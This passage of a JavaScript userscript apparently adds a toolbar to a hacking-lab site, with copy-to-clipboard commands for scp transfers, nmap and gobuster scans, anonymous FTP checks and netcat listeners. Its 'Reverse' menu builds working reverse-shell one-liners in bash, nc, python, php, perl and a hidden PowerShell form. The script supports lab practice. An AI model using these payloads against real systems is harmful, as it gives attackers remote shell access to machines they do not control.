                        return copyAttackBoxFileCommand(
                            button,
                            function (info) {
                                return (
                                    'sshpass -p ' +
                                    shellQuote(info.password) +
                                    ' scp -P ' + getServicePort('ssh') + ' -o StrictHostKeyChecking=accept-new ' +
                                    '"/LOCAL/PATH/TO/FILE" ' +
                                    info.username +
                                    '@' +
                                    info.attackboxIp +
                                    ':"/REMOTE/DESTINATION/PATH/"'
                                );
                            },
                            true
                        );
                    }
                },
                {
                    label: 'Receive file from AttackBox',
                    description:
                        'Replace /REMOTE/PATH/TO/FILE and /LOCAL/DESTINATION/PATH/.',
                    action: function (button) {
                        return copyAttackBoxFileCommand(
                            button,
                            function (info) {
                                return (
                                    'sshpass -p ' +
                                    shellQuote(info.password) +
                                    ' scp -P ' + getServicePort('ssh') + ' -o StrictHostKeyChecking=accept-new ' +
                                    info.username +
                                    '@' +
                                    info.attackboxIp +
                                    ':"/REMOTE/PATH/TO/FILE" ' +
                                    '"/LOCAL/DESTINATION/PATH/"'
                                );
                            },
                            true
                        );
                    }
                }
            ])
        );
        content.appendChild(filesMenu);

        const nmapMenu = makeMenuButton(
            'Nmap',
            resolveMenuOptions('Nmap', [
                ...[
                    { heading: 'No ping / filtered discovery' },
                    { label: 'HTTP port — no ping, scripts and versions', context: 'target', command: 'sudo nmap -Pn -sV -sC -p {{httpPort}} -oN nmap-web.txt {{targetIp}}' },
                    { label: 'HTTPS port — no ping, scripts and versions', context: 'target', command: 'sudo nmap -Pn -sV -sC -p {{httpsPort}} -oN nmap-https.txt {{targetIp}}' },
                    { label: 'Stage 1 — all TCP ports, fast, no ping', context: 'target', command: 'sudo nmap -Pn -p- --min-rate 5000 -oN nmap-ports.txt {{targetIp}}' },
                    { label: 'Stage 2 — scan discovered ports', context: 'targetPorts', command: 'sudo nmap -Pn -sV -sC -p {{scanPorts}} -oN nmap-services.txt {{targetIp}}' },
                    { separator: true }
                ].map(function (item) {
                    return item.command ? Object.assign({}, item, { action: makeRemoteMenuAction(item) }) : item;
                }),
                {
                    label: 'Top ports - scripts and versions',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'sudo nmap -sV -sC ' +
                                '-oN nmap-top.txt ' +
                                targetIp
                            );
                        });
                    }
                },
                {
                    label: 'All TCP ports - fast',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'sudo nmap -p- ' +
                                '--min-rate 5000 ' +
                                '-oN nmap-all.txt ' +
                                targetIp
                            );
                        });
                    }
                },
                {
                    label: 'All TCP ports - scripts and versions',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'sudo nmap -sV -sC -p- ' +
                                '--min-rate 5000 ' +
                                '-oN nmap-sv-all.txt ' +
                                targetIp
                            );
                        });
                    }
                },
                {
                    label: 'All TCP ports - no ping',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'sudo nmap -Pn -sV -sC -p- ' +
                                '--min-rate 5000 ' +
                                '-oN nmap-pn-all.txt ' +
                                targetIp
                            );
                        });
                    }
                },
                {
                    label: 'Aggressive scan',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'sudo nmap -A -oN nmap-aggressive.txt ' +
                                targetIp
                            );
                        });
                    }
                },
                {
                    label: 'UDP top 100',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'sudo nmap -sU --top-ports 100 ' +
                                '-oN nmap-udp-top100.txt ' +
                                targetIp
                            );
                        });
                    }
                }
            ])
        );

        content.appendChild(nmapMenu);

        const gobusterMenu = makeMenuButton(
            'Gobuster',
            resolveMenuOptions('Gobuster', [
                {
                    label: 'HTTP dirs — selected wordlist',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'gobuster dir -u http://' +
                                targetIp + ':' + getServicePort('http') +
                                ' -w {{wordlist}} ' +
                                '-o gobuster-common.txt'
                            );
                        });
                    }
                },
                {
                    label: 'HTTP dirs + extensions',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'gobuster dir -u http://' +
                                targetIp + ':' + getServicePort('http') +
                                ' -w {{wordlist}} ' +
                                '-x php,txt,html,js,bak,zip ' +
                                '-o gobuster-common-ext.txt'
                            );
                        });
                    }
                },
                {
                    label: 'HTTP dirs — selected wordlist',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'gobuster dir -u http://' +
                                targetIp + ':' + getServicePort('http') +
                                ' -w {{wordlist}} ' +
                                '-o gobuster-medium.txt'
                            );
                        });
                    }
                },
                {
                    label: 'HTTP dirs + extensions',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'gobuster dir -u http://' +
                                targetIp + ':' + getServicePort('http') +
                                ' -w {{wordlist}} ' +
                                '-x php,txt,html,js,bak,zip ' +
                                '-o gobuster-medium-ext.txt'
                            );
                        });
                    }
                },
                {
                    label: 'HTTPS dirs — selected wordlist',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'gobuster dir -k -u https://' +
                                targetIp + ':' + getServicePort('https') +
                                ' -w {{wordlist}} ' +
                                '-o gobuster-https-common.txt'
                            );
                        });
                    }
                },
                {
                    label: 'VHost enum',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'gobuster vhost -u http://' +
                                targetIp + ':' + getServicePort('http') +
                                ' -w {{dnsWordlist}} ' +
                                '--append-domain ' +
                                '-o gobuster-vhost.txt'
                            );
                        });
                    }
                },
                {
                    label: 'FFUF dirs — selected wordlist',
                    action: function (button) {
                        copyTargetCommand(button, function (targetIp) {
                            return (
                                'ffuf -u http://' +
                                targetIp + ':' + getServicePort('http') +
                                '/FUZZ ' +
                                '-w {{wordlist}}'
                            );
                        });
                    }
                }
            ])
        );

        content.appendChild(gobusterMenu);

        content.appendChild(makeMenuButton('FTP', resolveMenuOptions('FTP', [
            { label: 'Connect to FTP', context: 'target', command: 'ftp {{targetIp}} {{ftpPort}}' },
            { label: 'Anonymous login (lftp)', context: 'target', command: "lftp -u anonymous,anonymous@ -p {{ftpPort}} {{targetIp}}" },
            { label: 'List files anonymously (curl)', context: 'target', command: "curl --user 'anonymous:anonymous@' --list-only {{ftpUrl}}/" },
            { label: 'Download file anonymously', context: 'target', command: "curl --user 'anonymous:anonymous@' {{ftpUrl}}/REMOTE_FILE -o LOCAL_FILE" },
            { label: 'Check anonymous access (Nmap)', context: 'target', command: 'nmap -sV -p {{ftpPort}} --script ftp-anon {{targetIp}}' }
        ].map(function (item) {
            return Object.assign({}, item, { action: makeRemoteMenuAction(item) });
        }))));

        const reverseShellMenu = makeMenuButton(
            'Reverse',
            resolveMenuOptions('Reverse', [
                { heading: 'Set port' },
                {
                    label: 'Set reverse shell port',
                    action: function () {
                        promptForPort();
                    }
                },
                { separator: true },
                { heading: 'Linux' },
                {
                    label: 'bash -i',
                    action: function (button) {
                        return copyReverseShell(button, function (ip, port) {
                            return (
                                'bash -c ' +
                                shellQuote(
                                    'bash -i >& /dev/tcp/' +
                                    ip +
                                    '/' +
                                    port +
                                    ' 0>&1'
                                )
                            );
                        });
                    }
                },
                {
                    label: 'sh /dev/tcp',
                    action: function (button) {
                        return copyReverseShell(button, function (ip, port) {
                            return (
                                'sh -i >& /dev/tcp/' +
                                ip +
                                '/' +
                                port +
                                ' 0>&1'
                            );
                        });
                    }
                },
                {
                    label: 'nc mkfifo',
                    action: function (button) {
                        return copyReverseShell(button, function (ip, port) {
                            return (
                                'rm /tmp/f; mkfifo /tmp/f; ' +
                                'cat /tmp/f | /bin/sh -i 2>&1 | ' +
                                'nc ' +
                                ip +
                                ' ' +
                                port +
                                ' > /tmp/f'
                            );
                        });
                    }
                },
                {
                    label: 'nc -e',
                    action: function (button) {
                        return copyReverseShell(button, function (ip, port) {
                            return (
                                'nc -e /bin/sh ' +
                                ip +
                                ' ' +
                                port
                            );
                        });
                    }
                },
                {
                    label: 'busybox nc',
                    action: function (button) {
                        return copyReverseShell(button, function (ip, port) {
                            return (
                                'busybox nc ' +
                                ip +
                                ' ' +
                                port +
                                ' -e /bin/sh'
                            );
                        });
                    }
                },
                {
                    label: 'python3',
                    action: function (button) {
                        return copyReverseShell(button, function (ip, port) {
                            return (
                                'python3 -c ' +
                                shellQuote(
                                    'import os,pty,socket;' +
                                    's=socket.socket();' +
                                    's.connect(("' + ip + '",' + port + '));' +
                                    '[os.dup2(s.fileno(),f) for f in (0,1,2)];' +
                                    'pty.spawn("/bin/bash")'
                                )
                            );
                        });
                    }
                },
                {
                    label: 'python2',
                    action: function (button) {
                        return copyReverseShell(button, function (ip, port) {
                            return (
                                'python -c ' +
                                shellQuote(
                                    'import os,pty,socket;' +
                                    's=socket.socket();' +
                                    's.connect(("' + ip + '",' + port + '));' +
                                    '[os.dup2(s.fileno(),f) for f in (0,1,2)];' +
                                    'pty.spawn("/bin/bash")'
                                )
                            );
                        });
                    }
                },
                {
                    label: 'php',
                    action: function (button) {
                        return copyReverseShell(button, function (ip, port) {
                            return (
                                'php -r ' +
                                shellQuote(
                                    '$sock=fsockopen("' + ip + '",' + port + ');' +
                                    'exec("/bin/sh -i <&3 >&3 2>&3");'
                                )
                            );
                        });
                    }
                },
                {
                    label: 'perl',
                    action: function (button) {
                        return copyReverseShell(button, function (ip, port) {
                            return (
                                'perl -e ' +
                                shellQuote(
                                    'use Socket;$i="' + ip + '";$p=' + port + ';' +
                                    'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));' +
                                    'if(connect(S,sockaddr_in($p,inet_aton($i)))){' +
                                    'open(STDIN,">&S");open(STDOUT,">&S");' +
                                    'open(STDERR,">&S");exec("/bin/sh -i");};'
                                )
                            );
                        });
                    }
                },
                { separator: true },
                { heading: 'Windows' },
                {
                    label: 'PowerShell TCP',
                    action: function (button) {
                        return copyReverseShell(button, function (ip, port) {
                            return (
                                'powershell -NoP -NonI -W Hidden -Exec Bypass -Command ' +
                                shellQuote(
                                    '$client = New-Object System.Net.Sockets.TCPClient("' + ip + '",' + port + ');' +
                                    '$stream = $client.GetStream();' +
                                    '[byte[]]$bytes = 0..65535|%{0};' +
                                    'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){' +
                                    '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);' +
                                    '$sendback = (iex $data 2>&1 | Out-String );' +
                                    '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";' +
                                    '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);' +
                                    '$stream.Write($sendbyte,0,$sendbyte.Length);' +
                                    '$stream.Flush()};' +
                                    '$client.Close()'
                                )
                            );
                        });
                    }
                }
            ])
        );

        content.appendChild(reverseShellMenu);

        const listenerMenu = makeMenuButton(
            'Listener',
            resolveMenuOptions('Listener', [
                {
                    label: 'nc listener',
                    action: function (button) {
                        copyListener(button, function (port) {
                            return 'nc -lvnp ' + port;
                        });
                    }
                },
                {
                    label: 'rlwrap nc listener',
                    action: function (button) {
                        copyListener(button, function (port) {
                            return 'rlwrap -cAr nc -lvnp ' + port;
                        });
                    }
                },
                {
                    label: 'pwncat listener',
                    action: function (button) {
                        copyListener(button, function (port) {
                            return 'pwncat-cs -lp ' + port;
                        });
                    }
                },
                {
                    label: 'socat listener',
                    action: function (button) {
                        copyListener(button, function (port) {
                            return (
                                'socat file:`tty`,raw,echo=0 tcp-listen:' +
                                port
                            );
                        });
                    }
                },
                { separator: true },
                {
                    label: 'Set listener port',
                    action: function () {
                        promptForPort();
                    }
                }
            ])
        );

        content.appendChild(listenerMenu);

        document.body.appendChild(bar);

        enableBarDragging(bar, moveHandle);
        applySavedBarPosition(bar);

        setBarMinimized(
            bar,
            content,
            minimizeButton,
            maximizeButton,
            localStorage.getItem(barMinimizedKey) === 'true'
        );

        window.addEventListener('resize', function () {
            clampBarToViewport(bar, true);
        });
    }

    async function boot() {
        await loadRemoteMenus();
        addBar();

        const observer = new MutationObserver(function () {
            addBar();
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });

        window.addEventListener('popstate', function () {
            setTimeout(addBar, 500);
        });

        document.addEventListener('click', function (event) {
            if (
                !event.target.closest ||
                !event.target.closest('#thm-ssh-helper-bar')
            ) {
                closeAllMenus(null);
            }
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', boot);
    } else {
        boot();
    }
})();
